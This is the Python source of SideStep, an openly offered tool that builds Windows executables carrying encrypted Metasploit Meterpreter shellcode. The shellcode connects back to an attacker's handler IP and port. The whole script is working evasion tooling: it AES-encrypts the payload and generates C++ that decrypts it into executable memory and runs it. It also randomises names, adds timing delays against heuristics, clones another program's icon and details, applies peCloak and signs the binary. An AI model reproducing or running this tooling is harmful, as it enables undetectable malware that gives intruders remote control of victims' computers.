"""
Name:           SideStep
Version:        0.2.0
Date:           3/30/2015
Author:         Josh Berry - josh.berry@codewatch.org
Github:         https://github.com/codewatchorg/sidestep

Description:    SideStep is yet another tool to bypass anti-virus software.  The tool generates Metasploit payloads encrypted using the CryptoPP library (license included), and uses several other techniques to evade AV.

Software Requirements:
Metasploit Community 4.11.1 - Update 2015031001 (or later)
Ruby 2.x
Windows (Tested on 7, 8, and 10)<BR>
Python 2.7.x
Visual Studio (free editions should be fine - tested on 2012 and 2015)
Cygwin with strip utility (if you want to strip debug symbols)
peCloak (if you want to use it - http://www.securitysift.com/pecloak-py-an-experiment-in-av-evasion/)
ditto (if you want to use it - https://github.com/mubix/ditto)
Mono (if you want to sign the executable - http://www.mono-project.com/download/)

Configuration Requirements:
Ruby, Python, strip.exe (if using it), and the cl.exe and lib.exe tools from Visual Studio need to be in your path.  Sorry, I tried to make it compile with mingw-gcc with no luck.

I leveraged ideas from the following projects to help develop this tool:
- https://github.com/nccgroup/metasploitavevasion
- https://github.com/inquisb/shellcodeexec

For code signing, a good example can be found here: https://developer.mozilla.org/en-US/docs/Signing_an_executable_with_Authenticode

"""

import argparse
import sys
import string
import subprocess
import os
import time
import re

from libs import rng
from libs import encryption
from libs import msfpayload
from libs import codesegments
from libs import cryptopp

def main(argv):
  # Build argument list for running the script
  parser = argparse.ArgumentParser(prog='sidestep.py', 
    formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    description='Generate an executable to bypass DEP and AV protections',
    epilog='Example: sidestep.py --file file.c --exe file.exe')
  parser.add_argument('--file', 
    default='sidestep.cpp',
    help='the file name in which the C code is placed')
  parser.add_argument('--exe', 
    default='sidestep.exe',
    help='the name of the final executable')
  parser.add_argument('--ip', 
    required=True,
    help='the IP on which the Metasploit handler is listening')
  parser.add_argument('--port', 
    required=True,
    help='the port on which the Metasploit handler is listening')
  parser.set_defaults(file='sidestep.cpp', exe='sidestep.exe')

  # Hold argument values in args
  args = vars(parser.parse_args())

  path_delim = ''
  if 'posix' in os.name:
    path_delim = '/'
  else:
    path_delim = '\\'

  # Load configuration options
  sys.path.append(os.getcwd() + path_delim + 'conf' + path_delim)
  import settings

  ip = args['ip']
  port = args['port']
  clOptions = '/GS /GL /analyze- /Zc:wchar_t /Zi /Gm /O2 /sdl /fp:precise /D "WIN32" /D "NDEBUG" /D "_CONSOLE" /D "_UNICODE" /D "UNICODE" /errorReport:prompt /WX- /Zc:forScope /Gd /Oy- /Oi /MT /EHsc /Fe"' + settings.exeDir + path_delim + args['exe'] + '" /Fo"' + settings.exeDir + path_delim + args['exe'].split('.')[0]  + '.obj" /Fd"' + settings.exeDir + path_delim + args['exe'].split('.')[0]  + '" /nologo /I"' + settings.vsPath + path_delim + 'include" /I"' + settings.vsPath + path_delim + 'atlmfc' + path_delim + 'include" /I"' + settings.sdkPath + path_delim + 'Include" /I"' + settings.kitPathIncl + '" "' + settings.sdkPath + path_delim + 'Lib' + path_delim + 'AdvAPI32.Lib" "' + settings.sdkPath + path_delim + 'Lib' + path_delim + 'Uuid.Lib" "' + settings.sdkPath + path_delim + 'Lib' + path_delim + 'Kernel32.Lib" "' + settings.kitPathLib + path_delim + 'libucrt.lib" ' + settings.cryptLibPath + ' ' + settings.sourceDir + path_delim + args['file']
  
  print '[+]  Preparing to create a Meterpreter executable'

  # Set the command line values
  sourceFile = open(settings.sourceDir + path_delim + args['file'], 'w')

  # Set DH parameter size
  dhLen = 1024
  if settings.dhSize == 2:
    dhLen = 2048

  execFuncVar = rng.genFunc(settings.randomFuncSize)
  execParamVar = rng.genVar(settings.randomVarSize)
  aesPayloadVar = rng.genVar(settings.randomVarSize)
  virtAllocFuncVar = rng.genFunc(settings.randomFuncSize)
  virtAllocFuncParam = rng.genVar(settings.randomVarSize)
  encKey = rng.genKey(settings.encKeyLen)
  encIv = rng.genIv(settings.encIvLen)
  heuristicFuncVar = rng.genFunc(settings.randomFuncSize)
  diffieFuncVar = rng.genFunc(settings.randomFuncSize)
  diffieDh = rng.genVar(settings.randomVarSize)
  diffieRnd = rng.genVar(settings.randomVarSize)
  diffieBits = rng.genVar(settings.randomVarSize)
  diffieCount = rng.genVar(settings.randomVarSize)
  diffieP = rng.genVar(settings.randomVarSize)
  diffieQ = rng.genVar(settings.randomVarSize)
  diffieG = rng.genVar(settings.randomVarSize)
  diffieV = rng.genVar(settings.randomVarSize)
  diffieE = rng.genVar(settings.randomVarSize)
  diffieMsg1 = rng.genData(settings.dataLen)
  diffieMsg2 = rng.genData(settings.dataLen)
  curTimeVar = rng.genVar(settings.randomVarSize)

  print '[-]\tCompiling CryptoPP library'
  cryptopp.compileCryptoPP(path_delim, settings.sourceDir, settings.vsPath, settings.sdkPath, settings.kitPathIncl)

  print '[-]\tGenerating the Meterpreter shellcode'
  clearPayload = msfpayload.payloadGenerator(settings.msfpath, settings.msfvenom, settings.msfmeterpreter, ip, port)

  print '[-]\tEncrypting Meterpreter executable'
  encPayload = encryption.aesCbc(settings.encKeyLen, settings.encIvLen, encKey, encIv, clearPayload)

  # int main() vars
  mainSt = rng.genVar(settings.randomVarSize)
  mainDecrypted = rng.genVar(settings.randomVarSize)
  mainEncodeKey = rng.genVar(settings.randomVarSize)
  mainEncodeIv = rng.genVar(settings.randomVarSize)
  mainDecodeCipher = rng.genVar(settings.randomVarSize)
  mainFuncPayload = rng.genFunc(settings.randomFuncSize)
  mainAesDecryption = rng.genVar(settings.randomVarSize)
  mainCbcDecryption = rng.genVar(settings.randomVarSize)
  mainStfDecryptor = rng.genVar(settings.randomVarSize)

  # virtual allocation function for writing shellcode to memory and executing
  virtAllocLen = rng.genVar(settings.randomVarSize)
  virtAllocPid = rng.genVar(settings.randomVarSize)
  virtAllocCode = rng.genVar(settings.randomVarSize)
  virtAllocAddr = rng.genVar(settings.randomVarSize)
  virtAllocPage_size = rng.genVar(settings.randomVarSize)

  print '[-]\tGenerating the source code for the executable'
  src = codesegments.cHeaders() + "\n"
  src += codesegments.execHeaderStub(execFuncVar, execParamVar) + "\n"
  src += "USING_NAMESPACE(CryptoPP)\n"
  src += codesegments.randVarsAndData(settings.paddingVars, lambda: rng.genVar(settings.randomVarSize), lambda: rng.genData(settings.dataLen)) + "\n"
  src += "std::string " + aesPayloadVar + " = \"" + encPayload + "\";\n"
  src += "int " + virtAllocFuncVar + "(std::string " + virtAllocFuncParam + ");\n"
  src += codesegments.delayTime(heuristicFuncVar, settings.heuristicTimerVar, settings.diffieDelay, diffieFuncVar, curTimeVar, diffieDh, dhLen, diffieRnd, diffieBits, diffieCount, diffieP, diffieQ, diffieG, diffieV, diffieE, diffieMsg1, diffieMsg2) + "\n"
  src += codesegments.mainStub(mainSt, heuristicFuncVar, mainDecrypted, mainEncodeKey, encKey, mainEncodeIv, encIv, mainDecodeCipher, mainFuncPayload, aesPayloadVar, mainAesDecryption, mainCbcDecryption, mainStfDecryptor, virtAllocFuncVar) + "\n"
  src += codesegments.virtualAllocStub(virtAllocFuncVar, virtAllocFuncParam, virtAllocLen, virtAllocPid, virtAllocCode, virtAllocAddr, virtAllocPage_size, execFuncVar, execParamVar) + "\n"

  print '[-]\tWriting the source code to ' + settings.sourceDir + path_delim + args['file']
  sourceFile.write(src)
  sourceFile.close()

  print '[-]\tCompiling the executable to ' + settings.exeDir + path_delim + args['exe']
  subprocess.Popen('cl ' + clOptions, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
  time.sleep(30)

  if settings.useStrip == 1:
    print '[-]\tStripping debugging symbols'
    subprocess.Popen('strip.exe -s ' + settings.exeDir + path_delim + args['exe'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    time.sleep(5)

  if settings.useDitto == 1:
    print '[-]\tAdding details and icon of ' + settings.dittoExe + ' to the executable'
    subprocess.Popen(settings.dittoPath + 'ditto.exe ' + settings.dittoExe + ' ' + settings.exeDir + path_delim + args['exe'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    time.sleep(5)

  if settings.usePeCloak == 1:
    print '[-]\tEncoding the PE file with peCloak'
    subprocess.Popen('python ' + settings.peCloakPath + 'peCloak.py ' + os.getcwd() + path_delim + settings.exeDir + path_delim + args['exe'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

    time.sleep(60)
    os.remove(os.getcwd() + path_delim + settings.exeDir + path_delim + args['exe'])
    for file in os.listdir(os.getcwd() + path_delim + settings.exeDir + path_delim):
      if re.search('cloaked', file):
        os.rename(os.getcwd() + path_delim + settings.exeDir + path_delim + file, os.getcwd() + path_delim + settings.exeDir + path_delim + args['exe'])

  if settings.useSigncode == 1:
    print '[-]\tSigning executable with certificate at ' + settings.certPVK
    subprocess.Popen(settings.signcodePath + ' -spc ' + settings.certSPC + ' -v ' + settings.certPVK + ' -a sha1 -$ commercial ' + settings.exeDir + path_delim + args['exe'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    time.sleep(3)

  print '[*]  Process complete!'

if __name__ == '__main__':
  main(sys.argv[1:])